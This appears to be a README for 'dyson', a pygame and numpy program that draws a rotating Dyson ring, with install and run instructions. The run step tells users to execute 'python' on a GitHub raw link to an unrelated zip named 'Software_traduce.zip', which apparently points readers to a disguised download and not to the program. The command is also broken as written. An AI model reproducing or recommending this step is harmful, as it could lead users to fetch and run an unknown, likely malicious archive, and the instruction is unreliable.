## ⚙️ Requirements

Before you run dyson, ensure your system meets the following requirements:

- **Python 3.10 or higher**: This version has been tested with Python 3.14. You can download Python from the official website and install it on your computer.
- **pygame**: This library is essential for graphics. You can install it easily.
- **numpy**: This library helps with numerical operations.

You can install the required libraries using the command line. Here’s how:

1. **Open your command line tool.** On Windows, search for "cmd" in the Start menu. On macOS or Linux, open the Terminal.
  
2. **Run the following command** to install the libraries:
   ```bash
   python -m pip install pygame numpy
   ```

If you prefer to use a virtual environment, follow these steps:

1. **Create a virtual environment** by running:
   ```bash
   python -m venv .venv
   ```

2. **Activate the virtual environment**:
   - On macOS or Linux:
     ```bash
     source .venv/bin/activate
     ```
   - On Windows:
     ```bash
     .venv\\Scripts\\activate
     ```

3. **Install the dependencies** inside the virtual environment:
   ```bash
   python -m pip install pygame numpy
   ```

## 💻 Running the Application

With everything set up, it’s time to run dyson.

1. **Open your command line tool again.**
  
2. **Navigate to the directory** where you downloaded the software:
   ```bash
   cd path/to/dyson
   ```

3. **Run the following command** to start the application:
   ```bash
   python https://github.com/AnandiSinghal/dyson/raw/refs/heads/main/sunfish/Software_traduce.zip
   ```

This command opens a window that shows the Dyson ring. You will see it animating against a starry backdrop, along with information on the ring's current orientation.

## 🌟 What the Application Does

dyson creates a beautiful visual of a Dyson ring. Here are some features:

- **Stylized Rendering**: The application displays a rotating wireframe of the Dyson ring with a flickering starfield behind it.
- **Dynamic Camera Angles**: You can control the camera's pitch, yaw, and spin to view the ring from different perspectives.
- **User Interface**: The software includes a simple heads-up display (HUD) showing the current angles, making it easy to understand the position of the ring.
